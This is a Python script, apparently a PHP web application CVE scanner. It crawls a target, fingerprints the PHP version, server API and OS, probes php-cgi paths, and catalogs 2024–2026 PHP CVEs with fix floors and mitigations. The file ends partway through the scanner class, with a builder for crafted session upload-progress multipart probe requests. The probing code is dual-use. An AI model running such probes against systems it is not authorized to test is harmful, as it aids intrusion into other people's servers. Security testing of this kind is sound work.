#!/usr/bin/env python3
"""
PHP Web Application CVE Scanner (2026 focus + recent core CVEs)
================================================================
One script that:
  1. Crawls the target web application
  2. Fingerprints PHP version / SAPI / stack
  3. Tests recent PHP CVEs — especially the 2026 critical RCE family
  4. Reports which CVEs the host is vulnerable to

2026 PHP core CVEs (primary):
  CVE-2026-109618  Critical  OOM longjmp / bailout corruption → RCE (php2shell)
  CVE-2026-109619  Critical  session.upload_progress stale global state UAF → RCE
  CVE-2026-115560  High      serialize_handler confusion via upload_progress → unserialize

Also checks 2024–2025 PHP core CVEs when version/SAPI evidence allows.

Usage:
  python3 php_app_cve_scanner.py https://target.example/
  python3 php_app_cve_scanner.py https://target.example/ -d 3 -m 150 -o report.json
  python3 php_app_cve_scanner.py https://target.example/ --only-2026
  python3 php_app_cve_scanner.py https://target.example/ --cookie "SESS=abc" --aggressive

Authorized testing only. RCE probes use safe markers (no reverse shells / no destructive cmds).

Author: Veiliux
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import ssl
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import deque
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from html.parser import HTMLParser
from typing import Optional
from urllib.robotparser import RobotFileParser

# ===========================================================================
# 2026 PHP CVE catalog (authoritative for this scanner)
# ===========================================================================
#
# Fixed floors (php.net 2026-10-21 security release):
#   8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
# PHP ≤ 8.1 is EOL → treat as vulnerable forever for 109618/109619.
#
# CVE-2026-109618 (GHSA-w8hw-w9fx-j79w)
#   OOM handling (zend_bailout/longjmp) can interrupt PHP while request data is
#   only partially initialized. Cleanup may treat invalid data as valid → RCE.
#   Mitigations (incomplete): memory_limit=-1 via php_admin_value; still PATCH.
#
# CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp)
#   Request-owned global state (session.upload_progress path) can survive after
#   backing memory is freed. Next request on SAME worker uses stale state → UAF RCE.
#   Highest impact: mod_php + Apache prefork. FPM chains also exist.
#   Immediate mitigation: session.upload_progress.enabled=0 (before request parse).
#   No session_start() required on bare <?php echo "OK"; ?> pages (mod_php).
#
# CVE-2026-115560 (informational / regular cycle)
#   Three-leg combo: serialize_handler=php_binary|php_serialize in config
#   + app ini_set() back to "php" before session_start()
#   + session.upload_progress still enabled.
#   Attacker plants key with "|" + serialized object via PHP_SESSION_UPLOAD_PROGRESS
#   → php reader splits on "|" → attacker-controlled unserialize.
#   Same mitigation: session.upload_progress.enabled=0.

PHP2SHELL_FIXED = {
    (8, 2): 35,
    (8, 3): 36,
    (8, 4): 27,
    (8, 5): 12,
}

CVE_2026 = {
    "CVE-2026-109618": {
        "title": "PHP OOM longjmp/bailout corruption → unauthenticated RCE (php2shell)",
        "severity": "CRITICAL",
        "cvss": "9.2",
        "ghsa": "GHSA-w8hw-w9fx-j79w",
        "fixed": "8.2.35 / 8.3.36 / 8.4.27 / 8.5.12",
        "remediation": (
            "Upgrade immediately to PHP ≥ 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. "
            "Interim: set memory_limit=-1 via php_admin_value (FPM pool / Apache) so apps cannot override. "
            "Updating is the only complete fix."
        ),
    },
    "CVE-2026-109619": {
        "title": "session.upload_progress stale global state UAF → unauthenticated RCE (php2shell)",
        "severity": "CRITICAL",
        "cvss": "9.2",
        "ghsa": "GHSA-6wmf-4rv5-p3rp",
        "fixed": "8.2.35 / 8.3.36 / 8.4.27 / 8.5.12",
        "remediation": (
            "Upgrade immediately to PHP ≥ 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. "
            "IMMEDIATE mitigation: session.upload_progress.enabled=0 in php.ini / FPM pool / "
            "Apache config that applies BEFORE request parsing. Restart all workers. "
            "Do NOT rely on ini_set() alone."
        ),
    },
    "CVE-2026-115560": {
        "title": "session.serialize_handler confusion via upload_progress → object injection",
        "severity": "HIGH",
        "cvss": "context (unserialize RCE if POP gadget exists)",
        "ghsa": "",
        "fixed": "regular cycle; mitigate with upload_progress.enabled=0 (same as 109619)",
        "remediation": (
            "Set session.upload_progress.enabled=0 now. "
            "Do not call ini_set('session.serialize_handler', ...) at runtime. "
            "Patch to 8.2.35+ when available. Verify per-SAPI ini (FPM pool ≠ CLI)."
        ),
    },
}

# 2024–2025 secondary rules (version floors)
CVE_SECONDARY_RULES = {
    "CVE-2024-4577":  {"branches": {(8, 1): 29, (8, 2): 20, (8, 3): 8}, "below": (8, 1, 0),
                      "title": "PHP CGI Argument Injection RCE (Windows Best-Fit)", "severity": "CRITICAL",
                      "remediation": "Upgrade ≥ 8.1.29/8.2.20/8.3.8. Avoid PHP-CGI on Windows.",
                      "windows_cgi": True},
    "CVE-2024-8926":  {"branches": {(8, 1): 30, (8, 2): 24, (8, 3): 12}, "below": (8, 1, 0),
                      "title": "Bypass of CVE-2024-4577 (alt Windows codepages)", "severity": "HIGH",
                      "remediation": "Upgrade ≥ 8.1.30/8.2.24/8.3.12.", "windows_cgi": True},
    "CVE-2024-8927":  {"branches": {(8, 1): 30, (8, 2): 24, (8, 3): 12}, "below": (8, 1, 0),
                      "title": "CGI Redirect-Status environment confusion", "severity": "HIGH",
                      "remediation": "Upgrade ≥ 8.1.30/8.2.24/8.3.12.", "windows_cgi": False},
    "CVE-2024-1874":  {"branches": {(8, 1): 28, (8, 2): 18, (8, 3): 5}, "below": (8, 1, 0),
                      "title": "proc_open array-syntax cmd injection (Windows)", "severity": "HIGH",
                      "remediation": "Upgrade ≥ 8.1.28/8.2.18/8.3.5.", "windows_only": True},
    "CVE-2024-5458":  {"branches": {(8, 1): 29, (8, 2): 20, (8, 3): 8}, "below": (8, 1, 0),
                      "title": "FILTER_VALIDATE_URL bypass", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.29/8.2.20/8.3.8."},
    "CVE-2024-11233": {"branches": {(8, 1): 31, (8, 2): 26, (8, 3): 14}, "below": (8, 1, 0),
                      "title": "quoted-printable-decode overread", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.31/8.2.26/8.3.14."},
    "CVE-2024-11234": {"branches": {(8, 1): 31, (8, 2): 26, (8, 3): 14}, "below": (8, 1, 0),
                      "title": "proxy request_fulluri header injection", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.31/8.2.26/8.3.14."},
    "CVE-2025-1217":  {"branches": {(8, 1): 32, (8, 2): 28, (8, 3): 19, (8, 4): 5}, "below": (8, 1, 0),
                      "title": "HTTP folded response header parsing", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.32/8.2.28/8.3.19/8.4.5."},
    "CVE-2025-1734":  {"branches": {(8, 1): 32, (8, 2): 28, (8, 3): 19, (8, 4): 5}, "below": (8, 1, 0),
                      "title": "HTTP headers missing colon accepted", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.32/8.2.28/8.3.19/8.4.5."},
    "CVE-2025-1736":  {"branches": {(8, 1): 32, (8, 2): 28, (8, 3): 19, (8, 4): 5}, "below": (8, 1, 0),
                      "title": "Insufficient EOL validation in user headers", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.32/8.2.28/8.3.19/8.4.5."},
    "CVE-2025-1861":  {"branches": {(8, 1): 32, (8, 2): 28, (8, 3): 19, (8, 4): 5}, "below": (8, 1, 0),
                      "title": "HTTP redirect follow limit insufficient", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.32/8.2.28/8.3.19/8.4.5."},
    "CVE-2025-1220":  {"branches": {(8, 1): 33, (8, 2): 29, (8, 3): 23, (8, 4): 10}, "below": (8, 1, 0),
                      "title": "NUL hostname fsockopen vs parse_url mismatch", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.33/8.2.29/8.3.23/8.4.10."},
    "CVE-2025-6491":  {"branches": {(8, 1): 33, (8, 2): 29, (8, 3): 23, (8, 4): 10}, "below": (8, 1, 0),
                      "title": "SOAP oversized xmlns NULL deref DoS", "severity": "MEDIUM",
                      "remediation": "Upgrade ≥ 8.1.33/8.2.29/8.3.23/8.4.10. Disable unused SOAP."},
}


# ===========================================================================
# Models
# ===========================================================================

@dataclass
class Finding:
    cve: str
    title: str
    severity: str
    status: str  # CONFIRMED | LIKELY | POSSIBLE | NOT_VULNERABLE | NOT_APPLICABLE | ERROR
    confidence: str  # high | medium | low | info
    evidence: list[str] = field(default_factory=list)
    affected_urls: list[str] = field(default_factory=list)
    remediation: str = ""
    notes: str = ""


@dataclass
class Fingerprint:
    php_version: Optional[str] = None
    php_version_source: str = ""
    server: str = ""
    powered_by: str = ""
    sapi_hints: list[str] = field(default_factory=list)
    tech: list[str] = field(default_factory=list)
    cookies: list[str] = field(default_factory=list)
    os_hints: list[str] = field(default_factory=list)
    is_windows: Optional[bool] = None
    is_cgi: Optional[bool] = None
    is_apache: bool = False
    is_nginx: bool = False
    is_mod_php_likely: bool = False
    is_fpm_likely: bool = False
    expose_php: bool = False
    upload_progress_signal: bool = False


# ===========================================================================
# HTTP
# ===========================================================================

class HttpClient:
    def __init__(self, timeout=12.0, verify_ssl=False, user_agent="PHP-App-CVE-Scanner/2.0",
                 extra_headers=None, cookie="", max_body=512_000, rate_delay=0.0):
        self.timeout = timeout
        self.user_agent = user_agent
        self.extra_headers = extra_headers or {}
        self.cookie = cookie
        self.max_body = max_body
        self.rate_delay = rate_delay
        self._last = 0.0
        self.ctx = ssl.create_default_context()
        if not verify_ssl:
            self.ctx.check_hostname = False
            self.ctx.verify_mode = ssl.CERT_NONE

    def _throttle(self):
        if self.rate_delay <= 0:
            return
        wait = self.rate_delay - (time.time() - self._last)
        if wait > 0:
            time.sleep(wait)
        self._last = time.time()

    def request(self, url, method="GET", data=None, headers=None, allow_redirects=True, timeout=None):
        self._throttle()
        h = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        h.update(self.extra_headers)
        if self.cookie:
            h["Cookie"] = self.cookie
        if headers:
            h.update(headers)

        to = timeout if timeout is not None else self.timeout
        current, history, body, meth = url, [], data, method.upper()

        for _ in range(8 if allow_redirects else 1):
            req = urllib.request.Request(current, data=body, headers=h, method=meth)
            try:
                with urllib.request.urlopen(req, timeout=to, context=self.ctx) as resp:
                    raw = resp.read(self.max_body + 1)
                    truncated = len(raw) > self.max_body
                    raw = raw[: self.max_body]
                    resp_headers = {k.lower(): v for k, v in resp.headers.items()}
                    sc = resp.headers.get_all("Set-Cookie") if hasattr(resp.headers, "get_all") else None
                    if sc:
                        resp_headers["set-cookie-list"] = sc
                    return {
                        "url": current, "final_url": resp.geturl(), "status": resp.status,
                        "headers": resp_headers, "body": raw, "error": None,
                        "history": history, "truncated": truncated,
                    }
            except urllib.error.HTTPError as e:
                raw = b""
                try:
                    raw = e.read(self.max_body)
                except Exception:
                    pass
                resp_headers = {k.lower(): v for k, v in (e.headers.items() if e.headers else [])}
                if allow_redirects and e.code in (301, 302, 303, 307, 308):
                    loc = e.headers.get("Location") if e.headers else None
                    if loc:
                        history.append({"url": current, "status": e.code})
                        current = urllib.parse.urljoin(current, loc)
                        if e.code == 303:
                            meth, body = "GET", None
                        continue
                return {
                    "url": current, "final_url": current, "status": e.code,
                    "headers": resp_headers, "body": raw, "error": None,
                    "history": history, "truncated": False,
                }
            except Exception as e:
                return {
                    "url": current, "final_url": current, "status": None,
                    "headers": {}, "body": b"", "error": str(e),
                    "history": history, "truncated": False,
                }
        return {
            "url": url, "final_url": current, "status": None, "headers": {},
            "body": b"", "error": "too many redirects", "history": history, "truncated": False,
        }

    def get(self, url, **kw):
        return self.request(url, "GET", **kw)

    def post(self, url, data, **kw):
        return self.request(url, "POST", data=data, **kw)


# ===========================================================================
# Crawl helpers
# ===========================================================================

class LinkFormParser(HTMLParser):
    def __init__(self, base_url: str):
        super().__init__()
        self.base = base_url
        self.links: set[str] = set()
        self.forms: list[dict] = []
        self._form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag in ("a", "link", "area") and a.get("href"):
            self.links.add(urllib.parse.urljoin(self.base, a["href"]))
        elif tag in ("script", "img", "iframe") and a.get("src"):
            self.links.add(urllib.parse.urljoin(self.base, a["src"]))
        elif tag == "form":
            self._form = {
                "action": urllib.parse.urljoin(self.base, a.get("action") or self.base),
                "method": (a.get("method") or "get").lower(),
                "enctype": a.get("enctype") or "application/x-www-form-urlencoded",
                "inputs": [],
            }
        elif tag in ("input", "button", "textarea", "select") and self._form is not None:
            name = a.get("name")
            if name:
                self._form["inputs"].append({
                    "name": name,
                    "type": (a.get("type") or tag).lower(),
                    "value": a.get("value") or "",
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def same_scope(url, root, include_subdomains=False):
    try:
        u, r = urllib.parse.urlparse(url), urllib.parse.urlparse(root)
        if u.scheme not in ("http", "https"):
            return False
        if u.netloc.lower() == r.netloc.lower():
            return True
        if include_subdomains:
            host, root_host = u.hostname or "", r.hostname or ""
            return host == root_host or host.endswith("." + root_host)
        return False
    except Exception:
        return False


def normalize_url(url):
    p = urllib.parse.urlparse(url)
    path = p.path or "/"
    while "//" in path:
        path = path.replace("//", "/")
    return urllib.parse.urlunparse((p.scheme, p.netloc, path, "", p.query, ""))


def url_key(url):
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc.lower()}{p.path or '/'}"


def parse_ver(v: str) -> Optional[tuple[int, int, int]]:
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)", (v or "").strip())
    return (int(m.group(1)), int(m.group(2)), int(m.group(3))) if m else None


def check_version_vulnerable(ver: str, rules: dict) -> Optional[bool]:
    pv = parse_ver(ver)
    if not pv:
        return None
    if "below" in rules and pv < rules["below"]:
        return True
    branches = rules.get("branches") or {}
    maj_min = (pv[0], pv[1])
    if maj_min in branches:
        return pv[2] < branches[maj_min]
    if branches:
        if maj_min > max(branches.keys()):
            return False
        if maj_min < min(branches.keys()):
            return True
    return None


def php2shell_version_vulnerable(ver: Optional[str]) -> tuple[Optional[bool], str]:
    """Return (vuln?, note) for CVE-2026-109618/109619 fix floor."""
    if not ver:
        return None, "PHP version unknown"
    pv = parse_ver(ver)
    if not pv:
        return None, f"Unparseable version: {ver}"
    # EOL ≤ 8.1 forever vulnerable
    if pv[0] < 8 or (pv[0] == 8 and pv[1] <= 1):
        return True, f"PHP {ver} is EOL (≤8.1) — vulnerable to php2shell with no backport"
    maj_min = (pv[0], pv[1])
    if maj_min in PHP2SHELL_FIXED:
        fixed = PHP2SHELL_FIXED[maj_min]
        if pv[2] < fixed:
            return True, f"PHP {ver} < {pv[0]}.{pv[1]}.{fixed} (fix floor) — VULNERABLE to CVE-2026-109618/109619"
        return False, f"PHP {ver} ≥ {pv[0]}.{pv[1]}.{fixed} (fix floor) — patched for CVE-2026-109618/109619"
    # 8.6+ or unknown future branch
    if pv[0] > 8 or (pv[0] == 8 and pv[1] > 5):
        return False, f"PHP {ver} is newer than known affected branches — likely patched"
    return None, f"PHP {ver} branch not in known matrix"


PHP_VER_RE = re.compile(r"(?:PHP[/\s]|php\s+)(\d+\.\d+\.\d+)", re.I)


# ===========================================================================
# Crawler
# ===========================================================================

class Crawler:
    INTERESTING_PATHS = [
        "/", "/index.php", "/index.html", "/info.php", "/phpinfo.php", "/test.php",
        "/i.php", "/pi.php", "/admin/", "/admin/index.php", "/login", "/login.php",
        "/wp-login.php", "/wp-admin/", "/wp-json/", "/api/", "/api/v1/",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe", "/cgi-bin/php.exe",
        "/cgi-bin/php-cgi", "/php.cgi", "/status.php", "/health.php", "/version.php",
        "/upload.php", "/uploads/", "/file.php", "/files.php",
    ]

    def __init__(self, root, client, max_pages=100, max_depth=3,
                 include_subdomains=False, respect_robots=False, verbose=True):
        self.root = root.rstrip("/") + "/"
        self.client = client
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.include_subdomains = include_subdomains
        self.respect_robots = respect_robots
        self.verbose = verbose
        self.visited: set[str] = set()
        self.pages: list[dict] = []
        self.forms: list[dict] = []
        self.endpoints: set[str] = set()
        self.params: set[str] = set()
        self.php_urls: set[str] = set()
        self.upload_forms: list[dict] = []
        self.errors: list[str] = []
        self.robots = None

    def log(self, msg):
        if self.verbose:
            print(f"  [*] {msg}")

    def allowed(self, url):
        if not same_scope(url, self.root, self.include_subdomains):
            return False
        if self.robots and self.respect_robots:
            try:
                return self.robots.can_fetch(self.client.user_agent, url)
            except Exception:
                return True
        return True

    def _extract_params(self, url):
        q = urllib.parse.urlparse(url).query
        if q:
            for k, _ in urllib.parse.parse_qsl(q, keep_blank_values=True):
                if k:
                    self.params.add(k)

    def fetch_page(self, url):
        r = self.client.get(url)
        if r.get("error") and r.get("status") is None:
            self.errors.append(f"{url}: {r['error']}")
            return None
        body = r.get("body") or b""
        ct = (r.get("headers") or {}).get("content-type", "")
        text = ""
        if "html" in ct.lower() or "php" in ct.lower() or "text/" in ct.lower() or "json" in ct.lower() or not ct:
            text = body.decode("utf-8", errors="replace")
        page = {
            "url": url, "final_url": r.get("final_url") or url, "status": r.get("status"),
            "headers": r.get("headers") or {}, "body": body, "text": text, "ct": ct, "error": r.get("error"),
        }
        self.pages.append(page)
        self.endpoints.add(url_key(r.get("final_url") or url))
        self._extract_params(url)
        self._extract_params(r.get("final_url") or url)
        path = urllib.parse.urlparse(url).path.lower()
        # Only count REAL PHP evidence — never seed-path 404s or SPA soft-200s
        st = r.get("status")
        hdrs = r.get("headers") or {}
        powered = str(hdrs.get("x-powered-by") or "")
        set_cookie = str(hdrs.get("set-cookie") or "")
        php_signal = (
            "php" in powered.lower()
            or "PHPSESSID" in set_cookie
            or bool(re.search(r"(?:PHP (?:Parse|Fatal) error|Warning:).*\.php", text or "", re.I))
            or ("phpinfo()" in (text or "") and "PHP Version" in (text or ""))
            or (ct and "php" in ct.lower() and "text/html" not in ct.lower())
        )
        if st is not None and st < 400 and php_signal:
            self.php_urls.add(url_key(url))
        elif st == 200 and (path.endswith(".php") or ".php?" in url.lower()):
            # 200 on .php only counts if not a generic SPA catch-all / plain 404 body
            body_l = (text or "")[:200].strip().lower()
            if body_l and body_l not in ("not found", "404 not found", "404") and len(body or b"") > 32:
                # still require some server-side cue; pure static SPA HTML is not PHP
                if "x-powered-by" in {k.lower() for k in hdrs} or "PHPSESSID" in set_cookie:
                    self.php_urls.add(url_key(url))

        links, forms = set(), []
        if text and ("html" in ct.lower() or "<html" in text.lower() or "<!doctype" in text.lower()
                     or "<form" in text.lower() or not ct):
            parser = LinkFormParser(r.get("final_url") or url)
            try:
                parser.feed(text)
            except Exception:
                pass
            links, forms = parser.links, parser.forms
            for form in forms:
                self.forms.append(form)
                self.endpoints.add(url_key(form["action"]))
                for inp in form.get("inputs") or []:
                    if inp.get("name"):
                        self.params.add(inp["name"])
                    if inp.get("type") == "file":
                        self.upload_forms.append(form)
        return {"page": page, "links": links, "forms": forms}

    def crawl(self):
        print(f"\n[CRAWL] {self.root} (max_pages={self.max_pages}, depth={self.max_depth})")
        if self.respect_robots:
            robots_url = urllib.parse.urljoin(self.root, "/robots.txt")
            try:
                rr = self.client.get(robots_url)
                if rr.get("status") == 200 and rr.get("body"):
                    rp = RobotFileParser()
                    rp.parse(rr["body"].decode("utf-8", errors="replace").splitlines())
                    self.robots = rp
                    self.log("Loaded robots.txt")
            except Exception:
                pass

        queue: deque[tuple[str, int]] = deque()
        seeds = [self.root] + [urllib.parse.urljoin(self.root, p) for p in self.INTERESTING_PATHS]
        for s in seeds:
            if self.allowed(s):
                queue.append((s, 0))

        skip_ext = (
            ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico", ".css", ".woff", ".woff2",
            ".ttf", ".eot", ".mp4", ".mp3", ".zip", ".gz", ".pdf", ".webp", ".map",
        )
        while queue and len(self.visited) < self.max_pages:
            url, depth = queue.popleft()
            key = url_key(url)
            q = urllib.parse.urlparse(url).query
            visit_id = key + ("?" + q if q else "")
            if visit_id in self.visited:
                continue
            if not self.allowed(url):
                continue
            path = urllib.parse.urlparse(url).path.lower()
            if any(path.endswith(ext) for ext in skip_ext):
                continue

            self.visited.add(visit_id)
            self.log(f"d{depth} [{len(self.visited)}/{self.max_pages}] {url}")
            result = self.fetch_page(url)
            if not result or depth >= self.max_depth:
                continue
            for link in result.get("links") or []:
                n = normalize_url(link)
                if self.allowed(n):
                    queue.append((n, depth + 1))
            if url.rstrip("/").endswith("sitemap.xml") and result["page"].get("text"):
                for m in re.findall(r"<loc>\s*([^<]+)\s*</loc>", result["page"]["text"], re.I):
                    n = normalize_url(m.strip())
                    if self.allowed(n):
                        queue.append((n, depth + 1))

        print(f"[CRAWL] Done: {len(self.pages)} pages, {len(self.endpoints)} endpoints, "
              f"{len(self.forms)} forms, {len(self.upload_forms)} upload forms, "
              f"{len(self.php_urls)} .php URLs, {len(self.params)} params")


# ===========================================================================
# Fingerprint
# ===========================================================================

def fingerprint(crawler: Crawler, client: HttpClient) -> Fingerprint:
    print("\n[FINGERPRINT] Stack analysis…")
    fp = Fingerprint()
    versions: list[tuple[str, str]] = []

    for page in crawler.pages:
        h = page.get("headers") or {}
        server = h.get("server", "")
        powered = h.get("x-powered-by", "")
        if server and not fp.server:
            fp.server = server
        if powered:
            fp.powered_by = powered
            fp.expose_php = True
            m = PHP_VER_RE.search(powered)
            if m:
                versions.append((m.group(1), "X-Powered-By"))
            if "PHP" in powered.upper():
                fp.tech.append("PHP")

        sc = h.get("set-cookie", "") or ""
        scl = h.get("set-cookie-list") or []
        for c in [sc] + list(scl):
            if not c:
                continue
            name = c.split("=", 1)[0].strip()
            if name and name not in fp.cookies:
                fp.cookies.append(name)
            if "phpsessid" in c.lower():
                fp.tech.append("PHP-sessions")

        text = page.get("text") or ""
        if "PHP Version" in text and ("phpinfo()" in text or "PHP API" in text or "System" in text):
            m = re.search(r"PHP Version\s*</td>\s*<td[^>]*>\s*(\d+\.\d+\.\d+)", text, re.I)
            if not m:
                m = re.search(r"PHP Version\s+(\d+\.\d+\.\d+)", text, re.I)
            if m:
                versions.append((m.group(1), f"phpinfo:{page['url']}"))
            m2 = re.search(r"Server API\s*</td>\s*<td[^>]*>\s*([^<]+)", text, re.I)
            if m2:
                sapi = m2.group(1).strip()
                fp.sapi_hints.append(sapi)
                if re.search(r"apache|mod_php|handler", sapi, re.I):
                    fp.is_mod_php_likely = True
                if re.search(r"fpm|cgi/fastcgi|frankenphp", sapi, re.I):
                    fp.is_fpm_likely = True
            m3 = re.search(r"System\s*</td>\s*<td[^>]*>\s*([^<]+)", text, re.I)
            if m3:
                sysline = m3.group(1).strip()
                fp.os_hints.append(sysline)
                if re.search(r"Win|Windows|NT", sysline, re.I):
                    fp.is_windows = True
                elif re.search(r"Linux|Ubuntu|Debian|CentOS|Unix", sysline, re.I):
                    fp.is_windows = False
            # upload_progress in phpinfo
            if re.search(r"session\.upload_progress\.enabled", text, re.I):
                if re.search(r"session\.upload_progress\.enabled.*?(On|1|true)", text, re.I | re.S):
                    fp.upload_progress_signal = True
                    fp.sapi_hints.append("phpinfo: session.upload_progress.enabled=On")

        for pat, name in [
            (r"wp-content|wordpress|wp-includes", "WordPress"),
            (r"laravel_session|XSRF-TOKEN", "Laravel"),
            (r"Drupal\.settings|/sites/default", "Drupal"),
            (r"Joomla!", "Joomla"),
            (r"magento|Mage\.", "Magento"),
        ]:
            if re.search(pat, text, re.I) or re.search(pat, str(h), re.I):
                if name not in fp.tech:
                    fp.tech.append(name)

        if re.search(r"(PHP Parse error|Fatal error:|Warning:).*\.php", text, re.I):
            fp.tech.append("PHP")
        m = PHP_VER_RE.search(text)
        if m:
            versions.append((m.group(1), f"body:{page['url']}"))

    if fp.server:
        if re.search(r"Win|Microsoft|IIS", fp.server, re.I):
            fp.is_windows = True if fp.is_windows is None else fp.is_windows
            fp.os_hints.append(fp.server)
        if re.search(r"Apache", fp.server, re.I):
            fp.is_apache = True
            fp.sapi_hints.append("Apache (possible mod_php / cgi)")
            if not fp.is_fpm_likely:
                fp.is_mod_php_likely = True  # heuristic
        if re.search(r"nginx", fp.server, re.I):
            fp.is_nginx = True
            fp.is_fpm_likely = True
            fp.sapi_hints.append("nginx (likely php-fpm)")
        if re.search(r"Microsoft-IIS|IIS", fp.server, re.I):
            fp.sapi_hints.append("IIS (possible FastCGI/CGI)")
            fp.is_windows = True
        if re.search(r"Caddy|FrankenPHP", fp.server, re.I):
            fp.sapi_hints.append(fp.server)

    # CGI path discovery
    for path in ("/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe", "/cgi-bin/php.exe", "/php.cgi"):
        url = urllib.parse.urljoin(crawler.root, path)
        if any(url_key(p["url"]) == url_key(url) for p in crawler.pages):
            for p in crawler.pages:
                if url_key(p["url"]) != url_key(url):
                    continue
                st = p.get("status")
                body = (p.get("text") or "")[:800]
                if st and st not in (404, 400) and re.search(r"php-cgi|CGI/1\.|No input file specified|Status: 4\d\d", body, re.I):
                    fp.is_cgi = True
                    fp.sapi_hints.append(f"CGI path {url} → {st}")
            continue
        r = client.get(url, allow_redirects=False)
        st = r.get("status")
        if st and st not in (404, 400, None) and not r.get("error"):
            body = (r.get("body") or b"").decode("utf-8", errors="replace")
            # Require CGI-ish signals — bare 200 from SPA/front-controllers is not enough
            cgi_like = bool(re.search(r"php-cgi|CGI/1\.|No input file specified|Status: 4\d\d", body, re.I))
            powered = (r.get("headers") or {}).get("x-powered-by", "").lower()
            if cgi_like or (st in (500, 403) and "php" in powered) or path.endswith(".exe") and st == 200 and len(body) < 500 and "html" not in body.lower()[:100]:
                fp.is_cgi = True
                fp.sapi_hints.append(f"CGI candidate {url} → {st}")
                crawler.pages.append({
                    "url": url, "final_url": r.get("final_url") or url, "status": st,
                    "headers": r.get("headers") or {}, "body": r.get("body") or b"",
                    "text": body, "ct": "", "error": None,
                })

    if versions:
        def rank(item):
            src = item[1]
            if src.startswith("phpinfo"):
                return 0
            if src == "X-Powered-By":
                return 1
            return 2
        versions.sort(key=rank)
        fp.php_version, fp.php_version_source = versions[0]

    # Require real PHP signals — crawler seed .php paths alone are NOT evidence
    real_php = bool(
        fp.php_version
        or fp.powered_by
        or crawler.php_urls
        or any(c.upper() == "PHPSESSID" for c in fp.cookies)
        or fp.upload_progress_signal
        or any("phpinfo" in h.lower() for h in fp.sapi_hints)
    )
    if "PHP" not in fp.tech and real_php:
        fp.tech.append("PHP")
    fp.tech = sorted(set(fp.tech))
    fp.sapi_hints = list(dict.fromkeys(fp.sapi_hints))

    print(f"  PHP version : {fp.php_version or 'unknown'} ({fp.php_version_source or 'n/a'})")
    print(f"  Server      : {fp.server or 'unknown'}")
    print(f"  X-Powered-By: {fp.powered_by or 'n/a'}")
    print(f"  Tech        : {', '.join(fp.tech) or 'n/a'}")
    print(f"  Apache/nginx: {fp.is_apache}/{fp.is_nginx}  mod_php~={fp.is_mod_php_likely} fpm~={fp.is_fpm_likely}")
    print(f"  Windows/CGI : {fp.is_windows}/{fp.is_cgi}")
    print(f"  SAPI hints  : {fp.sapi_hints or ['n/a']}")
    return fp


# ===========================================================================
# Scanner
# ===========================================================================

class Scanner:
    def __init__(self, root, client, crawler, fp, aggressive=False, only_2026=False):
        self.root = root
        self.client = client
        self.crawler = crawler
        self.fp = fp
        self.aggressive = aggressive
        self.only_2026 = only_2026
        self.findings: list[Finding] = []
        # shared probe results for 2026 family
        self._up_probe = None  # type: ignore

    def add(self, f: Finding):
        self.findings.append(f)
        icon = {"CONFIRMED": "[!]", "LIKELY": "[+]", "POSSIBLE": "[?]",
                "NOT_VULNERABLE": "[-]", "NOT_APPLICABLE": "[-]", "ERROR": "[x]"}.get(f.status, "[*]")
        print(f"  {icon} {f.cve} [{f.status}/{f.confidence}] {f.title}")
        for e in f.evidence[:4]:
            print(f"      • {e[:160]}")

    def candidate_php_urls(self) -> list[str]:
        urls, seen = [], set()
        for u in list(self.crawler.php_urls) + [self.root, urllib.parse.urljoin(self.root, "/index.php")]:
            k = url_key(u)
            if k not in seen:
                seen.add(k)
                urls.append(u)
        for p in self.crawler.pages:
            if p.get("status") == 200:
                u = p.get("final_url") or p.get("url")
                k = url_key(u)
                if k not in seen:
                    seen.add(k)
                    urls.append(u)
        # Prefer endpoints that already look dynamic
        return urls[:30]

    # ----- multipart builders for 2026 probes -----

    def _multipart_upload_progress(self, progress_name: str, file_sizes: list[int],
                                   extra_fields: Optional[list[tuple[str, str]]] = None,
                                   boundary: Optional[str] = None) -> tuple[str, bytes]:
        boundary = boundary or ("----P2S" + "".join(random.choices(string.hexdigits, k=12)))
        chunks: list[bytes] = []
        # MUST be first field for the upload_progress hook
        chunks.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"{progress_name}\r\n".encode()
        )
        if extra_fields:
            for name, val in extra_fields:
                chunks.append(
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                    f"{val}\r\n".encode()
                )
        for i, sz in enumerate(file_sizes):
            data = os.urandom(min(sz, 64)) + (b"A" * max(0, sz - 64)) if sz else b""
            # keep deterministic for size
            data = (b"A" * sz) if sz else b""
            chunks.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="f{i}"; filename="x{i}.bin"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n".encode()
                + data + b"\r\n"
            )
        chunks.append(f"--{boundary}--\r\n".encode())
        return boundary, b"".join(chunks)

